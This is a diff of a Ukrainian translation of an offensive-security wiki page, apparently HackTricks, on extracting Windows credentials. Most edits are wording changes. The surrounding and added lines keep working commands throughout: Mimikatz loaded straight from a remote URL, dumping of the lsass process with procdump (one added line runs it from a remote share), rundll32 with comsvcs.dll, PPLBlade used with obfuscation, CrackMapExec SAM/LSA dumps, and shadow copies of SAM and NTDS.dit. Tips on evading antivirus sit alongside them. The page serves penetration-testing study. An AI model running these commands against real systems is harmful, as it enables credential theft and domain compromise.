@@ -24,7 +24,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Дізнайтеся про деякі можливі захисти облікових даних тут.**](credentials-protections.md) **Ці захисти можуть запобігти витоку деяких облікових даних за допомогою Mimikatz.**
+[**Дізнайтеся про деякі можливі способи захисту облікових даних тут.**](credentials-protections.md) **Ці заходи можуть запобігти витоку деяких облікових даних за допомогою Mimikatz.**
 
 ## Облікові дані з Meterpreter
 
@@ -51,12 +51,16 @@ mimikatz_command -f "lsadump::sam"
 
 Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
 Ви можете використовувати цей інструмент для **дампу процесу lsass**, **завантаження дампу** та **екстракції** **облікових даних локально** з дампу.
+
+Ви також можете використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -69,14 +73,14 @@ mimikatz # sekurlsa::logonPasswords
 
 **Примітка**: Деякі **AV** можуть **виявити** використання **procdump.exe для дампу lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" та "lsass.exe"**. Тому **більш непомітно** передати **PID** lsass.exe як **аргумент** для procdump **замість** **імені lsass.exe.**
 
-### Дамп lsass за допомогою **comsvcs.dll**
+### Дамп lsass з **comsvcs.dll**
 
 DLL з назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі збою. Ця DLL містить **функцію** з назвою **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
-Не має значення використовувати перші два аргументи, але третій поділяється на три компоненти. Перший компонент становить ідентифікатор процесу, який потрібно дампити, другий представляє місце розташування файлу дампу, а третій компонент - це строго слово **full**. Альтернативних варіантів не існує.\
-Після аналізу цих трьох компонентів DLL залучається до створення файлу дампу та перенесення пам'яті вказаного процесу в цей файл.\
+Не має значення використовувати перші два аргументи, але третій поділяється на три компоненти. Ідентифікатор процесу, який потрібно дампити, становить перший компонент, місце розташування файлу дампу представляє другий, а третій компонент - це строго слово **full**. Альтернативних варіантів не існує.\
+Після розбору цих трьох компонентів DLL залучається для створення файлу дампу та перенесення пам'яті вказаного процесу в цей файл.\
 Використання **comsvcs.dll** можливе для дампу процесу lsass, що усуває необхідність завантажувати та виконувати procdump. Цей метод описаний детально на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Наступна команда використовується для виконання:
+Для виконання використовується наступна команда:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
@@ -100,7 +104,7 @@ Get-Process -Name LSASS
 
 [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) - це інструмент для дампінгу захищених процесів, який підтримує обфускацію дампів пам'яті та їх передачу на віддалені робочі станції без запису на диск.
 
-**Ключові функціональні можливості**:
+**Ключові функції**:
 
 1. Обхід захисту PPL
 2. Обфускація файлів дампів пам'яті для уникнення механізмів виявлення на основі підписів Defender
@@ -114,7 +118,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Витягування секретів LSA
+### Вивантаження секретів LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
@@ -154,7 +158,7 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 #### Using vssadmin
 
-vssadmin binary доступний лише у версіях Windows Server
+vssadmin binary доступний лише в версіях Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -167,7 +171,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Але ви можете зробити те ж саме з **Powershell**. Це приклад **як скопіювати файл SAM** (жорсткий диск, що використовується, - "C:", і він зберігається в C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
+Але ви можете зробити те ж саме з **Powershell**. Це приклад **як скопіювати файл SAM** (використовується жорсткий диск "C:" і він зберігається в C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -182,27 +186,27 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Облікові дані Active Directory - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
 Файл **NTDS.dit** відомий як серце **Active Directory**, що містить важливі дані про об'єкти користувачів, групи та їх членство. Саме тут зберігаються **хеші паролів** для доменних користувачів. Цей файл є базою даних **Extensible Storage Engine (ESE)** і знаходиться за адресою **_%SystemRoom%/NTDS/ntds.dit_**.
 
 У цій базі даних підтримуються три основні таблиці:
 
-- **Таблиця даних**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
-- **Таблиця зв'язків**: Вона відстежує відносини, такі як членство в групах.
-- **Таблиця SD**: Тут зберігаються **безпекові дескриптори** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.
+- **Data Table**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
+- **Link Table**: Вона відстежує відносини, такі як членство в групах.
+- **SD Table**: Тут зберігаються **Security descriptors** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.
 
 Більше інформації про це: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
 Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і він використовується _lsass.exe_. Тоді **частина** файлу **NTDS.dit** може бути розташована **в пам'яті `lsass`** (ви можете знайти останні доступні дані, ймовірно, через покращення продуктивності за рахунок використання **кешу**).
 
-#### Розшифровка хешів всередині NTDS.dit
+#### Дешифрування хешів всередині NTDS.dit
 
 Хеш шифрується 3 рази:
 
-1. Розшифрувати ключ шифрування пароля (**PEK**) за допомогою **BOOTKEY** та **RC4**.
-2. Розшифрувати **хеш** за допомогою **PEK** та **RC4**.
-3. Розшифрувати **хеш** за допомогою **DES**.
+1. Дешифрувати ключ шифрування пароля (**PEK**) за допомогою **BOOTKEY** та **RC4**.
+2. Дешифрувати **хеш** за допомогою **PEK** та **RC4**.
+3. Дешифрувати **хеш** за допомогою **DES**.
 
 **PEK** має **однакове значення** в **кожному контролері домену**, але він **шифрується** всередині файлу **NTDS.dit** за допомогою **BOOTKEY** файлу **SYSTEM контролера домену (відрізняється між контролерами домену)**. Ось чому, щоб отримати облікові дані з файлу NTDS.dit, **вам потрібні файли NTDS.dit та SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
